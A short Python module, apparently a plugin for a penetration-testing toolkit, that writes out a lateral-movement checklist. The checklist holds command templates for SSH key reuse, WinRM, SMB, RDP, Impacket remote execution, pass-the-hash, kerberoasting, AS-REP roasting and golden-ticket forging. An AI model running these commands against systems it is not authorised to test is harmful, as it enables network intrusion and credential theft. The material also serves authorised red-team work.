"""lateral — lateral movement checklist (ssh, winrm, smb, rdp, wmi)"""
from pathlib import Path

VECTORS = {
    "ssh":       "ssh user@host -i key   # reuse keys from loot",
    "winrm":     "evil-winrm -i host -u user -p pass",
    "smb":       "smbclient //host/share -U user%pass",
    "rdp":       "xfreerdp /u:user /p:pass /v:host",
    "wmi":       "wmiexec.py user:pass@host",
    "psexec":    "psexec.py user:pass@host",
    "atexec":    "atexec.py user:pass@host 'cmd'",
    "dcom":      "dcomexec.py user:pass@host",
    "pass_hash": "psexec.py -hashes :NThash user@host",
    "kerberoast":"GetUserSPNs.py domain/user:pass -request",
    "asreproast":"GetNPUsers.py domain/ -no-pass -usersfile users.txt",
    "golden_tkt":"ticketer.py -nthash krbtgt -domain-sid S -domain dom user",
}

class Lateral:
    def run(self, session, logger):
        out = Path("reports") / "lateral_checklist.txt"
        out.parent.mkdir(exist_ok=True)
        lines = ["# Lateral movement checklist", ""]
        for name, cmd in VECTORS.items():
            lines.append(f"## {name}")
            lines.append(f"  {cmd}")
            lines.append("")
            print(f"  [{name}]")
            logger.info("lateral_vector", name=name)
        out.write_text("\n".join(lines))
        return {"vectors": VECTORS, "file": str(out)}
